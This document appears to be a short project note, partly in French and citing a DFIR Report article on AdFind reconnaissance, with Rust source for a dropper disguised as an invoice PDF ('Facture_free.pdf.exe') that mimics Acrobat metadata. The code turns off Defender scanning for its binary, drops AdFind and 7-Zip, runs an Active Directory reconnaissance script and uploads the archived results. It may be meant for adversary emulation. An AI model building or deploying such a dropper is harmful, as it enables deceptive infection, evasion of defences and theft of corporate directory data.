# Adfind
ref: https://thedfirreport.com/2020/05/08/adfind-recon/

Nom du fichier :  "Facture_free.pdf.exe"

# Code
main.rs
```rust
fn main() {

    let dropzone = r"C:\Users\Public\Downloads\";

    //Adfind tools
    let adfind_bin = include_bytes!("payload/AdFind.bin");
    let adfind_cmd = include_str!("payload/adfind.cmd");
    
    //7zip
    let  sevenzip_a = include_bytes!("payload/7zip/7za.dll");
    let  sevenzip_xa = include_bytes!("payload/7zip/7zxa.dll");
    let  sevenzip_exe = include_bytes!("payload/7zip/7za.exe");

    // exclude exe from defender
    tools::run_exe("powershell", "Add-MpPreference -ExclusionExtension find.exe");
    
    //let make a scope to close the file :)
    {
        File::create(format!("{}{}",dropzone,"find.exe")).expect("Oups").write_all(adfind_bin).unwrap();
        File::create(format!("{}{}",dropzone,"check.cmd")).expect("Oups").write_all( adfind_cmd.as_bytes()).unwrap();
        File::create(format!("{}{}",dropzone,"7za.dll")).expect("Oups").write_all(sevenzip_a).unwrap();
        File::create(format!("{}{}",dropzone,"7zxa.dll")).expect("Oups").write_all(sevenzip_xa).unwrap();
        File::create(format!("{}{}",dropzone,"7za.exe")).expect("Oups").write_all(sevenzip_exe).unwrap();
    }

    //    tools::run_exe("cmd", &format!("/C {}{}",dropzone,"check.cmd"))
    Command::new("cmd").current_dir(dropzone).args(["/C","check.cmd"]).spawn().expect("Oups");

    upload::io_file("C:\\Users\\Public\\Downloads\\ad.7z");
}
```

build.rs
```rust
let exe_metadata = Mimic::Acrobat;
```